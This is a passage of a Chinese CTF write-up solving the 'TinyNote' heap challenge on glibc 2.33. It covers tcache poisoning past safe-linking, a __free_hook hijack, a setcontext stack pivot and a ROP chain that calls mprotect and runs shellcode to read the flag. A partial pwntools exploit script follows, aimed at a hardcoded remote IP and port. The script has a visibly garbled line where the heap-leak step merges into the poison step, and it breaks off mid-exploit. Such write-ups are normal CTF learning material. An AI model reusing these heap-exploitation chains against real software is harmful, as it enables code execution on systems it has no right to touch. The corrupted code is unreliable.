可以看到，`_IO_base_buf` 就是 `memcpy` 的源内存区域，复制的长度满足 `2 * old_blen + 100`
的关系。所以，为了方便期间，我们可以先用两个变量来代表它们，并计算好长度：
        length = 0x240
        start = heap_addr + 0x240
        end = start + ((length) - 100)//2
显然，我们需要劫持 `__free_hook`，就要确保 `gadget` 被复制到 `__free_hook`。这里，我们可以找一个合适的位置存放
`gadget`，并用 `start` 提前存储好它的位置。
####  6、布置 setcontext 的数据
从 `libc 2.31` 看是，`setcontext` 的代码发生了变化，不再是使用 `rdi` 而是使用了 `rdx`：
因此，我们需要先想办法修改 `rdx`，这里需要使用到一个 `gadget`：
    mov rdx, qword ptr [rdi + 8] ; 
    mov qword ptr [rsp], rax ; 
    call qword ptr [rdx + 0x20]
联想到，free 的变量是 `rdi`，也就是 `_IO_base_buf`。前面提到，我这里存储的是 `heap_addr+0x240`
的地址，因此，我们在 `heap+0x240` 中存放一个合适的地址值，使其满足：
    [rdx+0x20] ----> setcontext+61
    [rdx+0xa0] ----> 我们劫持的栈帧
    [rdx+0xa8] ----> 第一条 ROP 指令
这里，我挑选的位置 `rdx` 值为 `heap+0x40`，因为这个位置及不会影响 `0x20` 的 `tcachebin`，也不会影响后续存放
`ROP` 链，以及最终劫持 `__free_hook` 所需的 `tcache
bin`。那么，我们就见缝插针，在前面的步骤中，将这些值存放进去即可，具体可以看最后的 EXP。
####  7、将 free_hook 放入 tcache bin
这个和前面的步骤一样，将 `0x240` 的 `tcachebin` 写入 `__free_hook` 即可（加上首部是 `0x250`）。
        add(0)
        add(1)
        delete(0)
        delete(1)
        poc = ((heap_addr+0x180)>>12) ^ (heap_addr+0x850)
        edit(1, p64(poc))
        add(0)
        add(1)
        edit(1, p64(0) + p64(0))
        delete(0)
        add(2)
        add(2)
        edit(2, p64(0)+p64(free_hook))
####  8、构造 ROP 链
最后，就是要构造 ROP 链来执行 `read` 并将 `rsp` 劫持到我们写入的位置，这样可以方便我们后续的操作。这里，我选择的位置是
`heap+0x1c0`，构造方法同样是用 UAF，最终构造出来的 ROP 链如下：
这里，可能有师傅会问，这里怎么少了 `pop rdi` 呢？还记得前面提到的 `setcontext` 吗？
    [rdx+0x20] ----> setcontext+61
    [rdx+0xa0] ----> 我们劫持的栈帧
    [rdx+0xa8] ----> 第一条 ROP 指令
没错，`pop rdi` 就是放到这里。
####  9、劫持 rsp 和 rip
最后，我们只需要想办法触发 `exit` ，那么我们就往 `0x20` 的 `tcache bin` 上放入 `__free_hook`，然后再申请它即可（
**顺便一提，到这里刚刚好就把`unsorted chunk` 用完了**）。
        add(1)
        add(2)
        delete(1)
        delete(2)
        poc = ((heap_addr+0x280)>>12) ^ (free_hook) # 放入 free_hook 到 0x20 的 tcache bin 中
        edit(2, p64(poc))
        add(1)
        add(2) # 触发 exit
至此，我们就成功劫持 `rsp` 和 `rip` 了。
当然，最后出题人并不打算让我们直接 `orw` 获取 flag，还需要获取文件名，文件名每次随机生成的，格式位 `haha_flag_xxxxx`。
这里，为了方便，我就直接执行 `mprotect` 把 `heap` 内存区变成 `RWX`，然后执行 shellcode 获取文件名，最后读取文件即可。
        filename_addr = new_stack + 0x8 * 27
        poc = b''
        poc += p64(pop_rdi)
        poc += p64(heap_addr)
        poc += p64(pop_rsi)
        poc += p64(0x4000)
        poc += p64(pop_rdx)
        poc += p64(7)
        poc += p64(libc.sym['mprotect'])
        poc += p64(pop_rdi)
        poc += p64(0)
        poc += p64(pop_rsi)
        poc += p64(heap_addr)
        poc += p64(pop_rdx)
        poc += p64(0x100)
        poc += p64(libc.sym['read'])
        poc += p64(heap_addr)
        s(poc)
        shellcode = b''
        shellcode += asm(shellcraft.open('./'))
        shellcode += asm(shellcraft.getdents64(3, read_buf, 0x400))
        shellcode += asm(shellcraft.write(1,read_buf, 0x400))
        shellcode += asm('''
            mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;
            ''' % (heap_addr+0x100))
        s(shellcode)
        if local:
            r()
            filename = '/flag'
        else:
            ru(b'haha_')
            filename = 'haha_'+rr(10).decode()
            r()
            r()
        shellcode = asm(shellcraft.cat(filename))
        s(shellcode)
        log.success('flag: %s', ru(b'}').decode())
至此，我们就完成了这道题目的解答。
## 四、完整 EXP
由于整个做题过程比较混乱，我在 EXP 中添加了许多注释，供师傅们查看。
    #encoding:utf-8
    from pwn import *
    import re
    ip = '82.157.6.175'
    port = 24200 
    local = 0
    filename = './TinyNote'
    PREV_INUSE = 0x1
    IS_MMAPPED = 0x2
    NON_MAIN_ARENA = 0x4
    def create_connect():
        global io, elf, libc, libc_name
        elf = ELF(filename)
        context(os=elf.os, arch=elf.arch)
        if local:
            io = process(filename)
            if elf.arch == 'amd64':
                libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
            elif elf.arch == 'i386':
                libc_name = '/lib/i386-linux-gnu/libc.so.6'
        else:
            io = remote(ip, port)
        try:
            libc_name = 'libc-2.33.so'
            libc = ELF(libc_name)
        except:
            pass
    cc = lambda : create_connect()
    s = lambda x : io.send(x)
    sl = lambda x : io.sendline(x)
    sla = lambda x, y: io.sendlineafter(x, y)
    sa = lambda x, y: io.sendafter(x, y)
    g = lambda x: gdb.attach(io, x)
    r = lambda : io.recv(timeout=1)
    rr = lambda x: io.recv(x, timeout=1)
    rl = lambda : io.recvline(keepends=False)
    ru = lambda x : io.recvuntil(x)
    ra = lambda : io.recvall(timeout=1)
    it = lambda : io.interactive()
    cl = lambda : io.close()
    def add(idx):
        sa(b'Choice:', b'1')
        sa(b'Index:', str(idx).encode())
    def edit(idx, content):
        sa(b'Choice:', b'2')
        sa(b'Index:', str(idx).encode())
        sa(b'Content:', content.encode() if isinstance(content, str) else content)
    def show(idx):
        sa(b'Choice:', b'3')
        sa(b'Index:', str(idx).encode())
        ru(b'Content:')
    def delete(idx):
        sa(b'Choice:', b'4')
        sa(b'Index:', str(idx).encode())
    def mchunk_size(size):
        return p64(0) + p64(size)
    def pwn():
        cc()
        add(0)
        add(1)
        delete(0)
        show(0)
        heap_addr = u64(rr(5).ljust(0x8, b'\x00')) > 12) ^(heap_addr+0x50)
        edit(1, p64(poc))
        add(0)
        add(1)
        # 修改 0x240 的 tcache 数量，并构造好首部
        edit(1, p8(8)*8 + p64(0x241))
        delete(0)
        add(0)
        add(1)
        delete(0)
        delete(1)
        # 将 fd 指向刚刚构造好的 0x240 chunk
        poc = ((heap_addr+0x2e0)>>12) ^ (heap_addr+0x60)
        edit(1, p64(poc))
        add(1)
        add(0) # unsorted_chunk: heap+0x10
        log.success('unsorted_chunk: 0x%x', heap_addr+0x60)
        delete(1)
        add(1)
        edit(1, mchunk_size(0x21))
        add(1)
        edit(1, mchunk_size(0x451))
        for i in range(0x22):
            add(1)
        add(1)
        add(2)
        delete(1)
        delete(2)
        poc = ((heap_addr+0x780)>>12) ^ (heap_addr+0x310)
        edit(2, p64(poc))
        add(2)
        # 获得第一块 largebin_chunk，地址为 heap+0x300
        add(1) 
        log.success('large chunk No.1: 0x%x', heap_addr+0x300)
        delete(2)
        add(2)
        edit(2, mchunk_size(0x21))
        add(2)
        edit(2, mchunk_size(0x441))
        add(2)
        add(2)
        # 这里提前将 _IO_buf_end 的值填上
        edit(2, p64(end))
        for i in range(0x1f):
            add(2)
        add(2)
        edit(2, mchunk_size(0x31))
        add(2)
        delete(0)
        show(0)